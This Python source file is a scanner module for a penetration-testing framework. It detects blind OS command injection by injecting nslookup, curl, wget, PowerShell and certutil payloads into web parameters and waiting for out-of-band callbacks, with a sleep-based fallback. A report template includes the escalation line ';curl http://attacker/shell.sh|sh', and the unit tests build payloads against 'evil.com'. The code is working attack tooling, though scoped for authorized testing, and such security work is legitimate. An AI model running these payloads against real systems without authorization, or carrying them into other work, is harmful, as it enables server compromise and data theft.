"""Blind Command Injection — OOB Detection via ForgeCollab DNS/HTTP Callbacks.

Extends the existing cmd_inject.py module with blind OOB detection for
cases where command output is NOT reflected in the HTTP response.

Strategy:
    1. Register OOB token with ForgeCollab
    2. Inject payloads that trigger outbound DNS/HTTP:
       - ;nslookup TOKEN.collab-domain
       - |curl http://TOKEN.collab-domain/cmdi
       - $(wget http://TOKEN.collab-domain/cmdi)
       - `ping -c1 TOKEN.collab-domain`
       - PowerShell: Invoke-WebRequest http://TOKEN.collab-domain/cmdi
    3. ForgeCollab DNS/HTTP callback = HIGH confidence blind CMDi
    4. No callback → try time-based as fallback

This catches injection in:
    - Background job processors (cron, workers)
    - File processing pipelines (ImageMagick, ffmpeg)
    - Log processing (awk, sed, grep chains)
    - Network utilities (ping, traceroute, nslookup wrappers)
    - DevOps tools (ansible, terraform, CI/CD pipelines)

FOR AUTHORIZED PENETRATION TESTING AND RED TEAM OPERATIONS ONLY.
"""
from __future__ import annotations

import asyncio
import logging
import sys
import time
import uuid
from pathlib import Path
from typing import Any
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity
from common.fp_reducer import FPReducer, Confidence

log = logging.getLogger("forge.blind_cmdi")

CVSS_RCE = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
CVSS40_RCE = "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H"


def _build_blind_cmdi_payloads(
    callback_domain: str, token: str
) -> list[tuple[str, str, str]]:
    """Generate blind CMDi payloads with OOB callbacks.

    Returns list of (payload_string, os_type, technique_label).
    Each payload triggers an outbound DNS or HTTP request to ForgeCollab.
    """
    base = f"{token}.{callback_domain}"

    return [
        # ── Linux: DNS-based (most reliable — nslookup/dig/host) ─
        (f";nslookup {base}#",           "linux",   "nslookup-semicolon"),
        (f"|nslookup {base}",            "linux",   "nslookup-pipe"),
        (f"$(nslookup {base})",          "linux",   "nslookup-subshell"),
        (f"`nslookup {base}`",           "linux",   "nslookup-backtick"),
        (f"&nslookup {base}&",           "linux",   "nslookup-ampersand"),
        (f"\nnslookup {base}\n",         "linux",   "nslookup-newline"),
        (f";dig {base}#",               "linux",   "dig-semicolon"),
        (f";host {base}#",              "linux",   "host-semicolon"),

        # ── Linux: HTTP-based (curl/wget — carries more data) ────
        (f";curl http://{base}/cmdi#",   "linux",   "curl-semicolon"),
        (f"|curl http://{base}/cmdi",    "linux",   "curl-pipe"),
        (f"$(curl http://{base}/cmdi)",  "linux",   "curl-subshell"),
        (f"`curl http://{base}/cmdi`",   "linux",   "curl-backtick"),
        (f";wget http://{base}/cmdi -O /dev/null#", "linux", "wget-semicolon"),
        (f"|wget -q http://{base}/cmdi", "linux",   "wget-pipe"),

        # ── Linux: ping-based (ICMP — works when DNS/HTTP blocked)
        (f";ping -c1 {base}#",          "linux",   "ping-semicolon"),
        (f"|ping -c1 {base}",           "linux",   "ping-pipe"),

        # ── Windows: DNS-based ───────────────────────────────────
        (f"& nslookup {base} &",         "windows", "nslookup-amp-win"),
        (f"| nslookup {base}",           "windows", "nslookup-pipe-win"),

        # ── Windows: HTTP-based (PowerShell) ─────────────────────
        (f"& powershell -c \"Invoke-WebRequest http://{base}/cmdi\" &",
                                         "windows", "powershell-iwr"),
        (f"& certutil -urlcache -f http://{base}/cmdi NUL &",
                                         "windows", "certutil-urlcache"),
        (f"& ping -n 1 {base} &",       "windows", "ping-win"),

        # ── Context-specific: quoted string breakouts ────────────
        (f"';nslookup {base}#'",         "linux",   "squote-breakout"),
        (f'";nslookup {base}#"',         "linux",   "dquote-breakout"),
        (f"$(IFS=];b]nslookup]{base})",  "linux",   "ifs-bypass"),
    ]


# Common parameters that wrap OS commands (ping, traceroute, lookup, etc.)
CMDI_PARAMS = [
    "ip", "host", "hostname", "target", "address", "url", "uri",
    "path", "file", "filename", "cmd", "command", "exec", "run",
    "ping", "domain", "server", "port", "interface", "query",
    "input", "data", "value", "name", "dest", "destination",
]


class BlindCmdi(BaseModule):
    """Blind OS command injection scanner with ForgeCollab OOB detection.

    Complements the existing cmd_inject.py module by adding OOB-based
    blind detection for cases where command output is not reflected.
    Uses DNS (nslookup/dig/host) and HTTP (curl/wget/powershell)
    callbacks to confirm code execution.
    """

    NAME        = "blind_cmdi"
    DESCRIPTION = "Blind OS command injection via OOB DNS/HTTP callbacks"
    PHASE       = 4
    TAGS        = ["injection", "rce", "blind", "oob", "cwe-78", "owasp-a03"]

    OOB_WAIT_SECONDS = 15.0
    PROBE_JITTER     = 0.1

    async def run(self) -> ModuleResult:
        start = time.monotonic()
        target = self.config.target.rstrip("/")

        if not self.check_scope(target):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        await self.rate_limit()

        # ── Get ForgeCollab ──────────────────────────────────────
        collab = self.config.extra.get("collab_client")
        collab_domain = (
            self.config.extra.get("collab_domain")
            or self.config.extra.get("FORGE_COLLAB_DOMAIN", "")
        )

        if not collab and not collab_domain:
            self.log.warning(
                "Blind CMDi requires ForgeCollab OOB server. "
                "Falling back to time-based only."
            )
            # Fall through — we'll still do time-based detection

        token = str(uuid.uuid4()).replace("-", "")[:24]
        if collab:
            token = collab.register("blind_cmdi", "cmdi", target, "params")

        callback_domain = collab_domain or (
            collab.domain if hasattr(collab, "domain") else ""
        )

        has_oob = bool(callback_domain)

        self.log.info(
            "Blind CMDi scan on %s (OOB: %s, token: %s…)",
            target,
            callback_domain or "DISABLED (time-based only)",
            token[:8],
        )

        # ── Generate payloads ────────────────────────────────────
        oob_payloads = _build_blind_cmdi_payloads(callback_domain, token) if has_oob else []
        time_payloads = self._time_based_payloads()

        # ── Phase 1: URL parameter injection (OOB) ───────────────
        oob_count = 0
        if has_oob:
            oob_count += await self._spray_url_params(target, oob_payloads)
            oob_count += await self._spray_forms(target, oob_payloads)
            oob_count += await self._spray_common_endpoints(target, oob_payloads)

        # ── Phase 2: Time-based fallback ─────────────────────────
        time_count = await self._time_based_scan(target, time_payloads)

        total = oob_count + time_count
        self.log.info("Blind CMDi: %d probes sent (%d OOB, %d time-based)", total, oob_count, time_count)

        # ── Wait for OOB callbacks ───────────────────────────────
        if has_oob and collab and oob_count > 0:
            self.log.info("Waiting %ds for OOB callbacks…", int(self.OOB_WAIT_SECONDS))
            got_callback = await collab.wait_for_callback(
                token, timeout=self.OOB_WAIT_SECONDS
            )
            if got_callback:
                callbacks = collab.get_callbacks(token)
                cb = callbacks[0] if callbacks else None
                self._report_oob_confirmed(target, token, cb, total)

        return self._make_result(start)

    # ══════════════════════════════════════════════════════════════
    # TIME-BASED PAYLOADS (fallback when no OOB server)
    # ══════════════════════════════════════════════════════════════

    @staticmethod
    def _time_based_payloads() -> list[tuple[str, str, float]]:
        """Time-based blind CMDi payloads. Returns (payload, label, delay_s)."""
        delay = 5
        return [
            (f"; sleep {delay}",            "sleep-semicolon",      float(delay)),
            (f"| sleep {delay}",            "sleep-pipe",           float(delay)),
            (f"$(sleep {delay})",           "sleep-subshell",       float(delay)),
            (f"`sleep {delay}`",            "sleep-backtick",       float(delay)),
            (f"& sleep {delay} &",          "sleep-bg-amp",         float(delay)),
            (f"'; sleep {delay} #",         "sleep-squote-break",   float(delay)),
            (f'"; sleep {delay} #',         "sleep-dquote-break",   float(delay)),
            # Windows
            (f"& timeout /T {delay} &",     "timeout-win",          float(delay)),
            (f"& ping -n {delay+1} 127.0.0.1 &", "ping-delay-win", float(delay)),
        ]

    # ══════════════════════════════════════════════════════════════
    # INJECTION METHODS
    # ══════════════════════════════════════════════════════════════

    async def _spray_url_params(
        self, target: str, payloads: list[tuple[str, str, str]]
    ) -> int:
        """Inject OOB CMDi payloads into URL parameters."""
        parsed = urlparse(target)
        if not parsed.query:
            return 0

        params = parse_qs(parsed.query, keep_blank_values=True)
        count = 0

        for param_name in params:
            original = params[param_name][0] if params[param_name] else ""
            # Use top 6 DNS-based payloads (most reliable OOB vector)
            for payload_str, os_type, label in payloads[:6]:
                await self.rate_limit()
                await asyncio.sleep(self.PROBE_JITTER)

                test_params = {k: v[0] for k, v in params.items()}
                test_params[param_name] = original + payload_str
                test_url = urlunparse(parsed._replace(query=urlencode(test_params)))

                try:
                    import aiohttp
                    async with aiohttp.ClientSession(
                        connector=aiohttp.TCPConnector(ssl=False)
                    ) as session:
                        async with session.get(
                            test_url, timeout=aiohttp.ClientTimeout(total=10),
                        ) as resp:
                            await resp.read()
                            count += 1
                except Exception:
                    pass

        return count

    async def _spray_forms(
        self, target: str, payloads: list[tuple[str, str, str]]
    ) -> int:
        """Inject OOB CMDi into discovered form fields."""
        forms = self.config.extra.get("found_forms", [])
        count = 0

        for form in forms[:10]:
            action = form.get("action") or target
            inputs = form.get("inputs", [])
            if not inputs:
                continue

            for field in inputs:
                for payload_str, _, _ in payloads[:4]:
                    await self.rate_limit()
                    data = {i: "test" for i in inputs}
                    data[field] = "test" + payload_str

                    try:
                        import aiohttp
                        async with aiohttp.ClientSession(
                            connector=aiohttp.TCPConnector(ssl=False)
                        ) as session:
                            async with session.post(
                                action, data=data,
                                timeout=aiohttp.ClientTimeout(total=8),
                            ) as resp:
                                await resp.read()
                                count += 1
                    except Exception:
                        pass

        return count

    async def _spray_common_endpoints(
        self, target: str, payloads: list[tuple[str, str, str]]
    ) -> int:
        """Inject OOB CMDi into common command-wrapping endpoints."""
        count = 0
        endpoints = [
            "/api/ping", "/api/lookup", "/api/check", "/api/test",
            "/tools/ping", "/tools/traceroute", "/tools/nslookup",
            "/admin/exec", "/admin/command", "/cgi-bin/ping.cgi",
            "/status", "/health", "/debug",
        ]

        for endpoint in endpoints:
            url = f"{target}{endpoint}"
            if not self.check_scope(url):
                continue

            for param in CMDI_PARAMS[:6]:
                for payload_str, _, _ in payloads[:3]:
                    await self.rate_limit()
                    try:
                        import aiohttp
                        async with aiohttp.ClientSession(
                            connector=aiohttp.TCPConnector(ssl=False)
                        ) as session:
                            # Try both GET and POST
                            async with session.get(
                                url, params={param: "127.0.0.1" + payload_str},
                                timeout=aiohttp.ClientTimeout(total=8),
                            ) as resp:
                                await resp.read()
                                count += 1

                            async with session.post(
                                url, data={param: "127.0.0.1" + payload_str},
                                timeout=aiohttp.ClientTimeout(total=8),
                            ) as resp:
                                await resp.read()
                                count += 1
                    except Exception:
                        pass

        return count

    async def _time_based_scan(
        self, target: str, payloads: list[tuple[str, str, float]]
    ) -> int:
        """Time-based blind CMDi detection as fallback."""
        parsed = urlparse(target)
        if not parsed.query:
            return 0

        params = parse_qs(parsed.query, keep_blank_values=True)
        count = 0

        for param_name in params:
            original = params[param_name][0] if params[param_name] else ""

            for payload_str, label, expected_delay in payloads[:4]:
                await self.rate_limit()

                test_params = {k: v[0] for k, v in params.items()}
                test_params[param_name] = original + payload_str
                test_url = urlunparse(parsed._replace(query=urlencode(test_params)))

                try:
                    import aiohttp
                    t_start = time.monotonic()
                    async with aiohttp.ClientSession(
                        connector=aiohttp.TCPConnector(ssl=False)
                    ) as session:
                        async with session.get(
                            test_url,
                            timeout=aiohttp.ClientTimeout(total=expected_delay + 10),
                        ) as resp:
                            await resp.read()
                            elapsed = time.monotonic() - t_start

                    count += 1

                    if elapsed >= expected_delay * 0.85:
                        # FPReducer verification
                        fp = FPReducer(
                            collab_client=self.config.extra.get("collab_client"),
                            headers=self.config.extra.get("session_headers", {}),
                        )
                        fp_result = await fp.verify("cmdi", target, param_name, method="GET")

                        if fp.should_report(fp_result):
                            self._report_time_based(
                                target, test_url, param_name, label,
                                elapsed, expected_delay, fp_result,
                            )
                            return count

                except asyncio.TimeoutError:
                    count += 1
                    # Timeout itself may indicate successful sleep injection
                    self.log.debug(
                        "Blind CMDi: timeout on %s (may indicate sleep injection)",
                        label,
                    )
                except Exception:
                    pass

        return count

    # ══════════════════════════════════════════════════════════════
    # REPORTING
    # ══════════════════════════════════════════════════════════════

    def _report_oob_confirmed(
        self, target: str, token: str,
        callback: Any, total_probes: int,
    ) -> None:
        """Report confirmed blind CMDi via OOB callback."""
        cb_type = "unknown"
        cb_source = "unknown"
        if callback:
            cb_type = getattr(callback.callback_type, "value", str(callback.callback_type))
            cb_source = callback.source_ip

        ev = Evidence(
            request_raw=f"Blind CMDi OOB spray — {total_probes} probes",
            response_raw=f"OOB {cb_type.upper()} callback from {cb_source}",
            extra={
                "token": token,
                "total_probes": total_probes,
                "callback_type": cb_type,
                "source_ip": cb_source,
                "confidence": "HIGH",
            },
        )

        self.new_finding(
            title=f"Blind OS Command Injection — CONFIRMED via OOB {cb_type.upper()}",
            severity=Severity.CRITICAL,
            description=(
                f"Blind OS command injection confirmed at {target}. "
                f"An injected payload triggered an outbound {cb_type.upper()} request "
                f"to ForgeCollab from {cb_source}, proving arbitrary command execution "
                "on the target server. Output is not reflected in HTTP responses, "
                "but the server executed the injected OS command.\n\n"
                "Impact: Full server compromise — arbitrary command execution allows "
                "data exfiltration, lateral movement, persistence installation, "
                "and complete infrastructure takeover."
            ),
            reproduction_steps=[
                f"1. Inject: ;nslookup TOKEN.{target} into vulnerable parameter",
                f"2. Observe DNS callback on ForgeCollab (token {token[:8]}…)",
                f"3. Confirmed: {cb_type.upper()} callback from {cb_source}",
                "4. Escalate: ;curl http://attacker/shell.sh|sh",
            ],
            remediation=(
                "1. NEVER pass user input to OS command functions (exec, system, popen)\n"
                "2. Use language-native APIs instead of shell commands\n"
                "3. If shell execution required, use strict allowlist validation\n"
                "4. Implement network segmentation — block unnecessary outbound traffic\n"
                "5. Use AppArmor/SELinux to restrict process capabilities"
            ),
            references=["CWE-78", "OWASP A03:2021"],
            evidence=ev,
            cvss_v31_vector=CVSS_RCE,
            cvss_v40_vector=CVSS40_RCE,
            mitre_attack=["TA0002/T1059", "TA0002/T1059.004"],
            target=target,
        )

    def _report_time_based(
        self, target: str, test_url: str, param: str, label: str,
        elapsed: float, expected_delay: float, fp_result: Any,
    ) -> None:
        """Report time-based blind CMDi detection."""
        ev = Evidence(
            request_raw=f"GET {test_url}",
            extra={
                "param": param,
                "payload_label": label,
                "elapsed": round(elapsed, 2),
                "expected_delay": expected_delay,
                "detection": "time-based",
                "fp_confidence": fp_result.confidence.value if fp_result else "UNVERIFIED",
                "fp_evidence": fp_result.evidence if fp_result else [],
            },
        )

        self.new_finding(
            title=f"Blind OS Command Injection (Time-Based) — '{param}'",
            severity=Severity.CRITICAL,
            description=(
                f"Time-based blind command injection in parameter '{param}'. "
                f"Payload '{label}' caused {elapsed:.1f}s delay "
                f"(expected ≥{expected_delay}s). "
                "The server executed the injected sleep/timeout command."
            ),
            reproduction_steps=[
                f"curl '{test_url}'",
                f"Observe {elapsed:.1f}s delay (normal response is <1s)",
                f"Payload type: {label}",
            ],
            remediation=(
                "Never pass user input to OS command functions. "
                "Use parameterized APIs instead of shell execution."
            ),
            references=["CWE-78", "OWASP A03:2021"],
            evidence=ev,
            cvss_v31_vector=CVSS_RCE,
            cvss_v40_vector=CVSS40_RCE,
            mitre_attack=["TA0002/T1059"],
            target=target,
        )


# ══════════════════════════════════════════════════════════════════════
# UNIT TESTS
# ══════════════════════════════════════════════════════════════════════

class TestBlindCmdi:
    def test_oob_payload_generation(self) -> None:
        payloads = _build_blind_cmdi_payloads("collab.test.com", "tok123")
        assert len(payloads) >= 15

    def test_payloads_contain_token(self) -> None:
        payloads = _build_blind_cmdi_payloads("evil.com", "abc")
        for p, os_type, label in payloads:
            assert "abc" in p, f"Token missing in {label}"

    def test_linux_and_windows_coverage(self) -> None:
        payloads = _build_blind_cmdi_payloads("evil.com", "tok")
        os_types = {p[1] for p in payloads}
        assert "linux" in os_types
        assert "windows" in os_types

    def test_dns_and_http_vectors(self) -> None:
        payloads = _build_blind_cmdi_payloads("evil.com", "tok")
        labels = {p[2] for p in payloads}
        assert any("nslookup" in l for l in labels)
        assert any("curl" in l for l in labels)

    def test_time_payloads(self) -> None:
        payloads = BlindCmdi._time_based_payloads()
        assert len(payloads) >= 6
        for p, label, delay in payloads:
            assert delay > 0

    def test_module_metadata(self) -> None:
        assert BlindCmdi.NAME == "blind_cmdi"
        assert "blind" in BlindCmdi.TAGS
        assert "oob" in BlindCmdi.TAGS

    def test_cmdi_params_not_empty(self) -> None:
        assert len(CMDI_PARAMS) >= 15
